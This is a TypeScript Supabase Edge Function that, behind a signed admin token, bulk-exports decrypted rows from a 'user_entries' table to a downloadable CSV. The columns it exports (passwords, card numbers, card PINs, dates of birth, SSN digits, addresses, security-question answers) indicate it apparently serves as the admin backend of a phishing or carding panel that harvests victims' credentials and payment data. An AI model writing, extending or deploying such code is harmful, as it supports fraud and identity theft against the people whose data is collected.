// redeploy 1779944431
// redeploy: 1779943933
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
import { decryptRow } from '../_shared/crypto.ts'
import { makeCorsHeaders, safeEqual as safeEqualHash } from '../_shared/cors.ts'

let _req: Request | null = null
const json = (body: Record<string, unknown>, status = 200) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { ...(_req ? makeCorsHeaders(_req) : {}), 'Content-Type': 'application/json' },
  })

const te = new TextEncoder()
const fromB64u = (value: string) => {
  const base64 = value.replace(/-/g, '+').replace(/_/g, '/').padEnd(Math.ceil(value.length / 4) * 4, '=')
  return Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
}
const b64u = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '')
const signPayload = async (payload: string) => {
  const secret = Deno.env.get('ADMIN_SESSION_SECRET')
  if (!secret || secret.length < 16) throw new Error('ADMIN_SESSION_SECRET not configured')
  const key = await crypto.subtle.importKey('raw', te.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'])
  return b64u(new Uint8Array(await crypto.subtle.sign('HMAC', key, te.encode(payload))))
}
async function checkLayer2Token(token: unknown, _ip: string): Promise<boolean> {
  if (typeof token !== 'string' || !token.includes('.')) return false
  const [payload, sig] = token.split('.')
  if (!payload || !sig || !(await safeEqualHash(sig, await signPayload(payload)))) return false
  try {
    const data = JSON.parse(new TextDecoder().decode(fromB64u(payload)))
    return Number(data?.layer) >= 2 && Number(data?.exp) > Date.now()
  } catch { return false }
}

const CSV_HEADERS = [
  'id','type','timestamp','user_id','password','first_name','last_name','email','phone',
  'card_number','pin_card','dob','ssn_last4','zip_code','street_address','apt_unit','challenge_questions','created_at',
]

const escapeCsv = (v: unknown): string => {
  if (v === null || v === undefined) return ''
  const s = typeof v === 'string' ? v : (typeof v === 'object' ? JSON.stringify(v) : String(v))
  if (s.includes('"') || s.includes(',') || s.includes('\n') || s.includes('\r')) {
    return `"${s.replace(/"/g, '""')}"`
  }
  return s
}

const rowToCsv = (r: any): string => CSV_HEADERS.map((k) => {
  if (k === 'password') return escapeCsv(r.password_field)
  return escapeCsv(r[k])
}).join(',')

async function runExport(sb: ReturnType<typeof createClient>, jobId: string) {
  const PAGE = 5000
  let processed = 0
  let lastCreatedAt: string | null = null
  const chunks: string[] = [CSV_HEADERS.join(',')]

  let total = 0
  try {
    const { data } = await sb.rpc('admin_fast_counts')
    total = Number((data as any)?.totalEntries ?? 0)
  } catch {}
  await sb.from('bulk_jobs').update({ total, updated_at: new Date().toISOString() }).eq('id', jobId)

  try {
    while (true) {
      let q = sb.from('user_entries').select('*')
        .order('created_at', { ascending: false })
        .limit(PAGE)
      if (lastCreatedAt) q = q.lt('created_at', lastCreatedAt)
      const { data, error } = await q
      if (error) throw error
      const rows = (data ?? []) as any[]
      if (rows.length === 0) break
      for (const r of rows) {
        const decrypted = (r as any)?.is_encrypted ? await decryptRow(r) : r
        chunks.push(rowToCsv(decrypted))
      }
      processed += rows.length
      lastCreatedAt = rows[rows.length - 1].created_at
      await sb.from('bulk_jobs').update({
        processed,
        total: Math.max(total, processed),
        updated_at: new Date().toISOString(),
      }).eq('id', jobId)
      if (rows.length < PAGE) break
    }

    const csv = chunks.join('\n')
    const path = `exports/${jobId}.csv`
    const { error: upErr } = await sb.storage.from('admin-exports').upload(path, new Blob([csv], { type: 'text/csv' }), {
      contentType: 'text/csv',
      upsert: true,
    })
    if (upErr) throw upErr

    const { data: signed, error: signErr } = await sb.storage.from('admin-exports').createSignedUrl(path, 60 * 60)
    if (signErr) throw signErr

    await sb.from('bulk_jobs').update({
      status: 'completed',
      processed,
      total: Math.max(total, processed),
      result_url: signed?.signedUrl ?? null,
      updated_at: new Date().toISOString(),
    }).eq('id', jobId)
  } catch (e: any) {
    await sb.from('bulk_jobs').update({
      status: 'failed',
      error_message: e?.message ?? String(e),
      updated_at: new Date().toISOString(),
    }).eq('id', jobId)
  }
}

Deno.serve(async (req) => {
  _req = req
  if (req.method === 'OPTIONS') return new Response('ok', { headers: makeCorsHeaders(req) })
  if (req.method !== 'POST') return json({ ok: false, error: 'method_not_allowed' }, 405)

  try {
    let body: any = {}
    try { body = await req.json() } catch {}
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0].trim() || req.headers.get('cf-connecting-ip') || 'unknown'
    if (!(await checkLayer2Token(body?.token, ip))) return json({ ok: false, error: 'layer2_required' }, 403)

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!
    const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    const sb = createClient(supabaseUrl, serviceKey, { auth: { persistSession: false } })

    const { data: job, error } = await sb.from('bulk_jobs').insert({
      kind: 'export', total: 0, processed: 0, status: 'processing',
    }).select('id').single()
    if (error || !job) return json({ ok: false, error: 'job_create_failed' }, 500)

    // @ts-ignore EdgeRuntime is available in Supabase Edge Functions
    EdgeRuntime.waitUntil(runExport(sb, job.id))

    return json({ ok: true, job_id: job.id })
  } catch (_e: any) {
    return json({ ok: false, error: 'server_error' }, 500)
  }
})
